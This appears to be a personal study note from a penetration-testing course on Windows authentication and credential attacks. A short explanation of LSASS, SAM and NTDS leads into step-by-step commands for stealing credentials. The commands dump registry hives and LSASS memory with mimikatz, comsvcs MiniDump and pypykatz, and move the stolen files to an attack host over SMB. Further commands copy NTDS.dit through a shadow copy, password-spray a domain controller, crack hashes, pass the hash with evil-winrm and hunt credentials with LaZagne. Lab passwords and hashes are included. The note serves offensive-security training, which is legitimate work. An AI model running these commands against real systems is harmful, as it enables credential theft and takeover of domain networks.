![[Auth_process1.webp]]

1. Credential connection
	- LogonUI.exe is running. Prompts passwords for credentials at login
	- User types in username and password, sent via RPS messages from Win32k.sys
	- WinLogon passes them the input credentials to Local Security Authority Subsystem Service (LSASS)
2. LSASS
	- This is comprised of multiple modules, governs all authentication processes
	- Does not validate credentials itself, but *loads* authentication packages (DLLs) and calls them. The packages to the work
	- Packages example
		- msv1_0.dll - local/NTLm interactive authentication package, compares computed NT hashes against SAM (or verifies NTLM challenge responses)
		- kerberos.dll - kerberos client/server logic
		- netlogon.dll - used on domain controllers for netlogon services and ticket validation for certain network operations
	- Is the authority that decides, issues tokens, holds secrets needed (ie runtime vault)
		- If attacker can read Lsass memory/create lsass udmp, can recover tickets, keys etc.
	- Lsass decides which authentication package to use
		- a. Local -> calls msv1_0.dll to validate against local SAM
		- b,c. domain interactive logon -> kerberos.dll (preferred) or netlogon/kdc path
		- c. smartcard/cert -> kerberos pkinit path or certificate-based auth package
- 3a. Local account logon (SAM check)
	- **Security Account Manager (SAM)** is a database file in WIndows storing user account creds, used to authenticate local and remote users
		- Passwords stored as LM/NTLM hashes at `%SystemRoot%\system32\config\SAM
	- msv1_0 takes supplied password, computes NT hash, compares with the one in the SAM hive
		- If match, LSA builds logon session and access token contianing user SID, group SIDs, pris, logon type, session ID
		- Winlogon continues, loading user profile, starting shell under new token, desktop appears
- 3b. Domain logon using Keberos (preferred domain path)
	- See `<kerberos file>
- 3c. Network logon using NTLM (challenge/response)
	- See `<NTLM file>

Credential manager
- Built in feature of all Windows OS that allows user to store and manage credentials used to access network resources, websites and applications
- Credentials encrypted, stored at 
	- `PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\`

NTDS (more in Kerberos/AD section)
- `NTDS.dit` - file hosted in Domain Controller
	- stores AD data, inclusing user accounts, group accounts, computer accounts, group policy objects..


# Attacking SAM, SYSTEM, SECURITY
3 registry hives if we have local **admin access** to target
- `HKLM/SAM
	- pw hashes for local user accounts
- `HKLM\SYSTEM`
	- stores system boot key, used to encrypt SAM database (above)
- `HKLM\SECURITY`
	- sensitive info used by LSA, including cached domain credentials (DCC2), cleartext passwords...

On windows, can run Mimikatz lsadump::sam
- `mimikatz.exe`
- `privilege::debug`
- `lsadump::sam

If want to transport to Linux to extract and crack hashes:
Saving copies of the hives
1. Launch cmd.exe with admin privileges
2. Save copies of hives
	- `reg.exe save hklm\sam C:\sam.save
	- `reg.exe save hklm\system C:\system.save`
	- `reg.exe save hklm\security C:\security.save`
3. Then can use various methods to transfer them to attack host
	- Create share with smb server
		- `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <share name> <local directory to host share>
			- run this on our attack host to create the share
		- `move sam.save \\<host ip>\<share name>
		- `move security.save \\<host ip>\<share name>
		- `move system.save \\<host ip>\<share name>
			- run these one Windows to transfer hive copies to share

After that,
Dumping hashes with secret dump
1. `locate secretsdump
2. `python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
	- Will try to rerieve system boot key (SYSTEM) before proceeding to dump the local SAM hashes (SAM)

Can also use crackmapexec to get the hashes instead of all that 
- `crackmapexec smb <target-IP> --local-auth -u <username> -p <password>`
- `netexec smb 10.129.42.198 --local-auth -u <username -p <password>` ``

After that,
Crack the hashes with Hashcat
1. Populate text file with the hashes dumped
	- `sudo vim hashestocrack.txt
		- paste inside here
2. See what hash type to specify
	- `man hashcat`
3. Crack based on hashtype (the hashdump from prev stage will show the type)
	- can identify type with hashid
		- `hashid -m <hash>`
		- Recap: see [[2. Hashcat]]
	- `sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt`
		- 1000: NT

*Dcc2 hashes`
- HKLM\security contains cached domain logon info in form of DCC2 hashes
- eg.
	- `inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25`
- Difficult to crack as it uses PBKDF2, and cannot be used for lateral movement with techniques like Pass-The-Hash
- Hashcat mode is 2100

*DPAPI*
- HKLM\security also dumps machine and use rkeys for DPAPI (Data Protection Application Programming Interface)
	- DPAPI - set of APIs in Windows used to encrypt/decrypt data blobs on per-user basis
	- These blobs utilized by various Windows OS features and third party applications, eg. Internet Explorer uess Password form auto-complete data..
- DPAPI encrypted credentials can be decrypted manually with tools like Impacket's dpapi, mimikatz, or remotely with DonPAPI

# Remote dumping, LSA secrets
- With access to credentials that have **local admin privileges**, can target LSA secrets over the network
	- `netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa`
		- Authenticate SMB, then dump LSA
- Can do the same for SAM
	- `netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt!`


# Attacking LSASS
1. Create a dump file, similar to copying contents of SAM
	- Task Manager way (need GUI)
		- Open Task Manager
		- Select the Processes tab
		- Find and right click the Local Security Authority Process
		- Select Create dump file
		- `lsass.DMP` created and saved in `%temp%`. Will transfer this to attack host
	- Rundll32.exe & Comsvcs.dll method
		- Find Lsass's PID 
			- From cmd, `tasklist /svc` and find `lsass.exe`PID
			- Or from powershell, `Get-Process lsass`
		- Create dumpfile with powershell
			- `rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID from above> C:\lsass.dmp full`
2. Transfer to attack host
	- Can do this with the same SMB method as above, in attacking SAM
	- `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <share name> <local directory to host share>
		- run this on our attack host to create the share
	- Then move the file to the share
		- `move lsass.dmp \\<host ip>\<share name`
	- Can also use any method found in [[2. Windows Uploads]]
3. Use Pypykatz to extract credentials (on attack host)
	- Like mimikatz, but can run on Linux, so can use it on the copied dump file offline
	- Lsass stores credentials that have **active** logon session on Windows
		- So when we dumped Lsass process memory into file, essentialy took a 'snapshot' of what was in memory at that pt in time
	- `pypykatz lsa minidump </path_to>/lsass.dmp 
	- Results:
		- MSV
			- Authentication package in Windows that LSA calls on to validate logon attempts against the SAM database
		- Wdigest
			- Older authentication protocol
			- Passwords in cleartext
		- Kerberos
			- Passwords, ekeys, tickets, pins
		- Dpapi
			- Dpapi masterkey for logged-on users
				- Can be then used to decrypt secrets associated with each of the applications using Dpapi and result in capturing of credentials for various accounts.
			- More in Windows Privilege Escalation topic
		- NT Hashes
			- Crack with hashcat
				- `sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt`

Mimikatz:
- sekurlsa module used to dump secrets from LSASS
- https://github.com/gentilkiwi/mimikatz
- `mimikatz.exe`
- `privilege::debug`
- `sekurlsa::logonpasswords`
	- Extract clear-text passwords, NTLM hashes and Kerberos tickets for currently logged on users
# Attacking Windows Credentials Manager
- Allows users to securely store credentials relevant to other systems and websites
- 2 types
	- Web credentials
	- Windows credentials
1. Enumerate credentials stored in current user's profiles
	- `cmdkey /list`
2. For domain credentials, eg. `Domain:interactive=SRV01\mcharles`
	- `Interactive` means credential used for interactive logon sessions
	- Can impersonate the stored user
		- `runas /savecred /user:SRV01\mcharles cmd`
			- Attempts to start cmd as user "SRV01\mcharles"
3. Extract credentials with mimikatz
	- `mimikatz.exe`
		- https://github.com/gentilkiwi/mimikatz
		- clone on Windows
	- `privilege::debug`
	- `sekurlsa::credman`
<kiv, come back to this>


# Attacking AD and NTDS.dit
- This section focus on extracting credentials through **dictionary attack** on AD accounts and **dumping hashes** from NTDS.dit
- (Assume already have a foothold on internal network)
- Windows login protocol:
	- When a Windows system is joined to domain, will no longer defauult to SAM to validate logon request
		- Instead it will send authenticaiton requests to domain controller (DC)
	- But SAM can still be used
		- By specifying hostname of device proceeded by Username (eg. WS01\nameofuser) or with direct acccess to device then typing .\ at logon UI in username field

Dictionary attack with Netexec:
1. Tailor dictionary based on naming convention
	- There are diff naming conventions like 
		- `firstinitiallastname`
		- `firstinitialmiddleinitiallastname`
	- Can often find email structure by Googling domain name, eg @inlanefreight.com to get valid emails. Then use script to scrape social media sites and mashup potential valid usernames. Can use google dorks to search for 'inlanefreight.com filetype: pdf', find valid usernames in PDF properties. 
	- Automated list generator
		- `git clone https://github.com/urbanadventurer/username-anarchy
		- `./username-anarchy -i names.txt > formattednames.txt 
2. Username Bruteforcing with Kerbrute
	- `wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64`
	- `chmod +x kerbrute_linux_amd64`
	- `./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local formattednames.txt`
		- Can find domain from nmap scan
		- Download kerbrute from `https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64`
	- See which usernames from above even work, identify naming convention..
3. Brute force attack aginst target domain controller with tool like NetExec
	- Can use with SMB protocol (like in prev examples) to send logon requests to target DC
	- `netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt`
	
Capturing NTDS.dit (with captured credentials from above)
- Stored at `%systemroot%/ntds` on domain controller in forest
- Is primary database file associated with AD; stores all domain usernames, password hashes and other critical schema information
1. Connect to DC with Evil-WinRM
	- `evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
	- Everything after this is ran within evil-winrm
2. Checking local group membership
	- `net localgroup`
	- Want to see if account has local admin rights
		- To make copy of NTDS.dit file, need local admin (`Administators` group) or Domain admin (`Domain Admins` group)
	- `net user bwilliamson`
		- Check group memberships - Admins/Domain Admins?
3. Create Volume Shadow Copy (VSS) of C: drive (or whatever drive NTDS is stored)
	- `vssadmin CREATE SHADOW /FOR=C:
4. Copy NTDS.dit from the VSS
	- `mkdir c:\NTDS`
	- `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit`
		- Adjust based on results form above VSS command
		- Now the NTDS file is in C:\NTDS
	- `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\system32\config\SYSTEM c:\NTDS\system`
		- Copy the HKLM\System as well, for decryption later on
5. Create the SMB share on attack host like previous methods (see SAM attacking)
	- ``sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <share name> <local directory to host share>`
	- or just `sudo impacket-smbserver share -smb2support .` 
		- `.` - just share the home directory
6.  Move file from target DC to the share on attack host
	- `cmd.exe /c move C:\NTDS\NTDS.dit \\<attack host IP>\<share name> `
	- ``cmd.exe /c move C:\NTDS\system \\<attack host IP>\<share name> ``
7. Extract hashes from NTDS.dit
	- IMPORTANT: Hashes in NTDS.dit encrypted with key stored in SYSTEM. Thus require transfer of SYSTEM. (see Attacking SAM, SYSTEM.. above)
	- `impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL`
		- Ran on local attack host
		- This assumes have the SYSTEM file also in this directory
		- Local -> run offline and not connect to remote host

Alternatively, single line command?
1. `netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil`


Cracking the hashes
- As seen before, with hashcat
	- `sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt`

If cannot crack the hash, 
## Pass The Hash
- Takes advantage of NTLM authentication protocol to authenticate user using **password hash**
	- Authenticate with `username:password hash` instead of `username:clear-text password`
- `evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
	- Useful for lateral movement


# Credential Hunting in Windows
Useful keywords
    Passwords
    Passphrases
    Keys
    Username
    User account
    Creds
    Users
    Passkeys
    configuration
    dbcredential
    dbpassword
    pwd
    Login
    Credentials
- Windows search for the above
- LaZagne
	- https://github.com/AlessandroZ/LaZagne/releases/
	- Keep a copy on attack host and transfer to target
	- Go to directory the file was uploaded to, and do 
		- `start LaZagne.exe all`
- findstr
	- `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
		- replace "password" with the other keywords above

    Passwords in Group Policy in the SYSVOL share
    Passwords in scripts in the SYSVOL share
    Password in scripts on IT shares
    Passwords in web.config files on dev machines and IT shares
    Password in unattend.xml
    Passwords in the AD user or computer description fields
    KeePass databases (if we are able to guess or crack the master password)
    Found on user systems and shares
    Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint



`